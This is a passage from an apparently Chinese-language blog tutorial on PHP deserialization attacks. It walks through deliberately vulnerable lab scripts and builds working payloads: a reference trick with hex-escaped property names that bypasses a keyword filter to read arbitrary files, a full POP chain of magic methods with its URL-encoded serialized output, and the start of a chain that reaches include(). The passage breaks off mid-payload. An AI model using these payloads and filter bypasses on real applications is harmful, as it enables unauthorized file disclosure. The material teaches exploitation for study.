class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>]; </span><br><span class="line">    <span class="keyword">if</span>(stristr(<span class="variable">$input</span>, <span class="string">&#x27;user&#x27;</span>)!==<span class="literal">False</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Hacker&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        unserialize(<span class="variable">$input</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>入手点在file_get_contents，__destruct()输出了对象，所以就会执行__tostring()。利用方法就是控制name属性，形成任意文件读。</p><p>但是这里要解决两个问题：</p><ol><li> $input传进来的等待反序列化的字符串不能含有user，这样我们就不能改写user属性了。-&gt; 使用大S支持16进制字符串</li><li>name属性不可控，只有user属性可控，不能利用file_get_contents。-&gt; 使用浅拷贝</li></ol><p>问题解决，构造payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyFile</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;/etc/hosts&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> MyFile();</span><br><span class="line"><span class="variable">$a</span>-&gt;name = &amp;<span class="variable">$a</span>-&gt;user;</span><br><span class="line"><span class="variable">$b</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span> = str_replace(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;u\\73er&quot;</span>, <span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$b</span> = str_replace(<span class="string">&quot;s&quot;</span>, <span class="string">&quot;S&quot;</span>, <span class="variable">$b</span>);</span><br><span class="line">var_dump(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">  </span><br><span class="line">O:<span class="number">6</span>:<span class="string">&quot;MyFile&quot;</span>:<span class="number">2</span>:&#123;S:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;S:<span class="number">0</span>:<span class="string">&quot;&quot;</span>;S:<span class="number">4</span>:<span class="string">&quot;u\73er&quot;</span>;R:<span class="number">2</span>;&#125;</span><br></pre></td></tr></table></figure><p>这里就是浅copy，$a-&gt;name = &amp;$a-&gt;user; </p><p>上面这个payload不用关心name和user具体的值，只需要建立浅copy，然后绕过对user的检测就行。file_get_contents的参数name，可以通过构造的浅copy，user参数进行赋值。</p><p>例如 user=D:\\.pem</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/unserialize/3-2.php?input=O:6:%22MyFile%22:2:&#123;S:4:%22name%22;S:0:%22%22;S:4:%22u\73er%22;R:2;&#125;&amp;user=D:\\.pem</span></span><br></pre></td></tr></table></figure><p><img src="https://lisianthus-images.oss-cn-hangzhou.aliyuncs.com/img/20210127152740.png"></p><h5 id="实例3-构造魔术函数层层递进链1"><a href="#实例3-构造魔术函数层层递进链1" class="headerlink" title="实例3 - 构造魔术函数层层递进链1"></a>实例3 - 构造魔术函数层层递进链1</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//3-3.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$test2</span>,<span class="variable">$arr</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$s1</span> = <span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">        <span class="variable">$s1</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod2 = <span class="string">&quot;字符串拼接&quot;</span>.<span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1-&gt;get_flag();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag:xxxxxxxxxxxx&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;string&#x27;</span>];</span><br><span class="line">unserialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用思路是让程序去执行get_flag方法，现在开始分析POP链怎么走</p><ol><li><p>string1类里的__toString方法调用了get_flag方法。那我们首先要把$this-&gt;str1 赋值为GetFlag类的对象。然后去寻找怎么样才能执行这个__toString</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;str1 = <span class="keyword">new</span> GetFlag()</span><br></pre></td></tr></table></figure></li><li><p>func类里的__invoke方法进行了字符串拼接。只要把$this-&gt;mod1赋值为string1类的对象，把对象作为了字符串，就能触发之前string1类的__toString方法。现在去寻找怎么样才能执行这个__invoke</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> string1() 　</span><br></pre></td></tr></table></figure></li><li><p>funct类里调用了$s1,那我们把$this-&gt;mod1赋值为func类的对象，把对象当做函数去调用，就能触发之前func类的__invoke方法。现在去寻找怎么样才能执行这个__call</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> func() </span><br></pre></td></tr></table></figure></li><li><p>Call类里的test1方法调用了test2方法，那么我们把$this-&gt;mod1赋值为funct类的对象，再去调用test2，由于funct类里根本没有test2对象，所以就会去执行之前funct类的__call方法。现在去寻找怎么样执行这个test1</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> funct() </span><br></pre></td></tr></table></figure></li><li><p>start_gg类里的__destruct方法调用了test1，现在我们只需要把$this-&gt;mod1赋值为Call类的对象就行了，魔术方法层层调用，POP链完成</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> Call()</span><br></pre></td></tr></table></figure></li></ol><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//这个POP链从下往上看</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> Call(); <span class="comment">//5.把mod1赋值为Call对象，__destruct会自动去执行mod1对象里的test1方法，结束，POP串起来，flag读出来</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> funct(); <span class="comment">//4.把mod1赋值为funct对象，test1会去执行mod1对象里的test2方法，压根没这个方法，所以触发下面的__call,现在想办法执行test1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> func(); <span class="comment">//3.把mod1赋值为func的对象，__call会把这个对象当函数执行，显然不行，就会触发下面的__invoke,现在想办法执行__call</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$test2</span>,<span class="variable">$arr</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$s1</span> = <span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">        <span class="variable">$s1</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> string1(); <span class="comment">//2.把mod1赋值为string1的对象，现在想办法去执行__invoke，invoke执行了，下面的toString也会执行</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod2 = <span class="string">&quot;字符串拼接&quot;</span>.<span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1 = <span class="keyword">new</span> GetFlag();  <span class="comment">//1.把str1赋值为GetFlag的对象，现在想办法去执行__toString，执行了就能拿到flag</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1-&gt;get_flag();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag:xxxxxxxxxxxx&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> start_gg;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$b</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">O%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>start_gg%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>mod1%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>Call%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>mod1%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>funct%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>mod1%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>func%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>mod1%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>string1%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>str1%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>GetFlag%<span class="number">22</span>%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>str2%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>mod2%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>mod2%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>mod2%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>mod2%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>Dflag:xxxxxxxxxxxx</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://lisianthus-images.oss-cn-hangzhou.aliyuncs.com/img/20210127163359.png"></p><h5 id="实例4-构造魔术函数层层递进链2"><a href="#实例4-构造魔术函数层层递进链2" class="headerlink" title="实例4 - 构造魔术函数层层递进链2"></a>实例4 - 构造魔术函数层层递进链2</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//3-4.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用思路是通过构造POP链改写$var，并执行include($value),形成任意文件读，现在开始分析POP怎么走：</p><ol><li><p>目标是调用include($value)，也就是调用append方法，append方法在Modifier类里的__invoke方法已经调用了。现在可以先给$value也就是$var赋值为任意文件，然后再去寻找怎么样才能执行这个__invoke</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span>  <span class="variable">$var</span> = <span class="string">&quot;D:\\.pem&quot;</span>;</span><br></pre></td></tr></table></figure></li><li><p>Test类里的__get方法return了一个函数调用，那么把$this-&gt;p赋值为Modifier类的对象，就会触发之前的那个__invoke,现在去寻找怎么样才能执行这个__get</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;p = <span class="keyword">new</span> Modifier()</span><br></pre></td></tr></table></figure></li><li><p>Show类里的__toString方法访问了str的source属性，那么把$this-&gt;str赋值为Test类的对象，Test类不存在这个source属性，就会触发__get,现在去寻找怎么样去执行这个__toString</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;str = <span class="keyword">new</span> Test()</span><br></pre></td></tr></table></figure></li><li><p>Show类的构造方法echo了字符串，那么把$this-&gt;source赋值为Show的对象，就会去触发__toString。POP链完成</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Show();</span><br><span class="line"><span class="keyword">$this</span>-&gt;source = <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure></li></ol><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 